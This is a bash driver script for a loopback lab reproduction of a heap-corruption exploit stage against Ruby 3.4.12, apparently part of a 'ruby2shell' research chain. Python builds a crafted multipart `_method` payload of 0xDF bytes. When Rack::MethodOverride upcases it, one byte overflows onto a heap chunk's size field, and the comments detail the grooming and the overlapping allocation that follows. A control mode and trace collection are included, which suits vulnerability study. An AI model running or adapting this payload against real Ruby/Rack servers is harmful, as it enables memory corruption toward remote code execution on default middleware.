#!/bin/bash
# Stage B over HTTP — driver. Loopback only.
#
# 1. Starts the lab Sinatra app (lab/repro/ruby2shell-stageB-http.ru) on
#    127.0.0.1:4547 under the mtrace preload, plain 3.4.12 build.
# 2. POST /trigger — GroomMiddleware (outside Sinatra, runs before
#    Rack::MethodOverride) builds [S 0x370][V 0x430][W live][dummy
#    0x360]; then the multipart `_method` part, ISO-8859-1, N=828 is
#    upcased by the DEFAULT middleware (Rack::MethodOverride) -> one
#    0x53 byte onto V's size LSB while V is in unsorted; result alloc
#    walks unsorted and bins V at 0x450.
#    CONTROL mode sends pure 0xDF*828 instead (same input length, no
#    parity flip, NO overflow; its upcase buffer2 request is 2 bytes
#    larger — immaterial, no byte is written past any buffer).
# 3. GET /mark — 0x450 marker alloc pops V, overlaps W; readback over
#    the live object.
#
# Evidence lands in lab/build/evidence/stageB-http-{1..N,control-N}.{trace,out}
set -u
cd "$(dirname "$0")/../.." || exit 1
RB=lab/build/plain/ruby-3.4.12-plain/bin/ruby
RU=lab/repro/ruby2shell-stageB-http.ru
EV=lab/build/evidence
PORT=4547
RUNS="${1:-5}"
MODE="${2:-run}"   # run|control

build_body() {  # $1 = attack|control (python emits the bytes)
  python3 - "$1" <<'PY'
import sys
mode = sys.argv[1]
data = (b'\xdf' * 828) if mode == 'control' else (b'a' + b'\xdf' * 827)
out = []
out.append(b'--XB\r\nContent-Disposition: form-data; name="_method"\r\n'
           b'Content-Type: text/plain; charset=ISO-8859-1\r\n\r\n')
out.append(data)
out.append(b'\r\n--XB\r\nContent-Disposition: form-data; name="f"\r\n'
           b'Content-Type: text/plain\r\n\r\nfiller\r\n--XB--\r\n')
sys.stdout.buffer.write(b''.join(out))
PY
}

for i in $(seq 1 "$RUNS"); do
  TAG=$i; [ "$MODE" = control ] && TAG="control-$i"
  TRACE="$EV/stageB-http-$TAG.trace"; OUT="$EV/stageB-http-$TAG.out"
  if [ "$MODE" = control ]; then
    STAGEB_CONTROL=1 MTRACE_FD=2 LD_PRELOAD=$PWD/lab/preload/mtrace.so \
      $RB $RU > "$TRACE" 2>&1 &
  else
    MTRACE_FD=2 LD_PRELOAD=$PWD/lab/preload/mtrace.so \
      $RB $RU > "$TRACE" 2>&1 &
  fi
  SRVPID=$!
  for t in $(seq 1 50); do
    curl -s -m 1 "http://127.0.0.1:$PORT/" >/dev/null 2>&1 && break
    sleep 0.2
  done
  if [ "$MODE" = control ]; then B=control; else B=attack; fi
  build_body "$B" > /tmp/stageb-http-body.bin
  {
    echo "== run $TAG $(date -u +%H:%M:%SZ)"
    echo "-- trigger:"; curl -s -m 15 -X POST "http://127.0.0.1:$PORT/trigger" \
      -H 'Content-Type: multipart/form-data; boundary=XB' \
      --data-binary @/tmp/stageb-http-body.bin -w 'HTTP %{http_code}\n'
    echo "-- mark:"; curl -s -m 10 "http://127.0.0.1:$PORT/mark"
    echo "-- alive after:"; curl -s -m 5 "http://127.0.0.1:$PORT/mark" || echo "SERVER DEAD"
  } > "$OUT" 2>&1
  kill $SRVPID 2>/dev/null; wait $SRVPID 2>/dev/null
  echo "== $TAG done"; head -8 "$OUT"
done
